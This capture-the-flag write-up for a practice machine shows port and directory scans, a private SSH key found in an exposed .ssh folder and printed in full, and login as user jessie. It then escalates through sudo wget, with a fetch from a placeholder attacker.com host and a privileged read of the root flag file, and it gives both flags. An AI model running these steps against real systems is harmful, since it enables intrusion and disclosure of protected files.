WEGL CTF 


ENUMERATION

"""

┌──(root㉿kali)-[/home/…/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Wegl CTF]
└─# sudo nmap -sS -sV -A 10.10.0.190 -oN nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 11:50 EST
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.83% done; ETC: 11:51 (0:00:17 remaining)
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 71.94% done; ETC: 11:52 (0:00:25 remaining)
Stats: 0:07:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 11:57 (0:00:00 remaining)
Nmap scan report for 10.10.0.190
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/24%OT=22%CT=1%CU=43222%PV=Y%DS=2%DC=T%G=Y%TM=6217B96
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(SP=1
OS:04%GCD=1%ISR=10C%TI=Z%II=I%TS=C)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=RD%II=I
OS:%TS=D)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O
OS:5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6
OS:=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   170.43 ms 10.11.0.1
2   170.71 ms 10.10.0.190

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 524.34 seconds



"""





GOBUSTER SCAN 

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Wegl CTF]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.0.190         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.190
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/24 11:51:02 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 11374]
Progress: 3094 / 4615 (67.04%)                  [ERROR] 2022/02/24 11:52:23 [!] Get "http://10.10.0.190/options": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/server-status        (Status: 403) [Size: 276]  
/sitemap              (Status: 301) [Size: 312] [--> http://10.10.0.190/sitemap/]
Progress: 3998 / 4615 (86.63%)                                                  [ERROR] 2022/02/24 11:52:51 [!] Get "http://10.10.0.190/SOAPMonitor": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
                                                                                 
===============================================================
2022/02/24 11:53:04 Finished
===============================================================


"""
FOUND USERNAME on index.html 

 <!-- Jessie don't forget to udate the webiste -->


FOUND A WEB AT /Sitemap 

LETS RUN GOBUSTER ON IT 

"""

└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.0.190/sitemap
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.190/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/24 11:55:05 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.ssh                 (Status: 301) [Size: 317] [--> http://10.10.0.190/sitemap/.ssh/]
/css                  (Status: 301) [Size: 316] [--> http://10.10.0.190/sitemap/css/] 
/fonts                (Status: 301) [Size: 318] [--> http://10.10.0.190/sitemap/fonts/]
/images               (Status: 301) [Size: 319] [--> http://10.10.0.190/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]                                       
/js                   (Status: 301) [Size: 315] [--> http://10.10.0.190/sitemap/js/]    
Progress: 2560 / 4615 (55.47%)                                                         [ERROR] 2022/02/24 11:56:07 [!] Get "http://10.10.0.190/sitemap/L": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 2971 / 4615 (64.38%)                                                         [ERROR] 2022/02/24 11:56:21 [!] Get "http://10.10.0.190/sitemap/OAErrorDetailPage": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3049 / 4615 (66.07%)                                                         [ERROR] 2022/02/24 11:56:24 [!] Get "http://10.10.0.190/sitemap/original": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3066 / 4615 (66.44%)                                                         [ERROR] 2022/02/24 11:56:24 [!] Get "http://10.10.0.190/sitemap/outgoing": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
                                                                                        
===============================================================
2022/02/24 11:57:00 Finished



"""

FOUND PRIVATE KEY ON .ssh 


"""

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----


"""

Download it with wget 



LETS LOG IN 


"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Wegl CTF]
└─$ ssh -i id_rsa jessie@10.10.0.190
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Desktop
jessie@CorpOne:~/Desktop$ ls
jessie@CorpOne:~/Desktop$ cd ..
jessie@CorpOne:~$ cd example.desktop
-bash: cd: example.desktop: No such file or directory
jessie@CorpOne:~$ cd examples.desktop
-bash: cd: examples.desktop: Not a directory
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
jessie@CorpOne:~/Documents$ 


"""
LETS ESCALATE 

"""
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Fetch a remote file via HTTP GET request.

URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo wget $URL -O $LFILE


"""

OR 

"""
File read
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file to be read is treated as a list of URLs, one per line, which are actually fetched by wget. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.

LFILE=/root/root_flag.txt
wget -i $LFILE
"""


I USED 2nd one 

root_flag.txt

b1b968b37519ad1daa6408188649263d


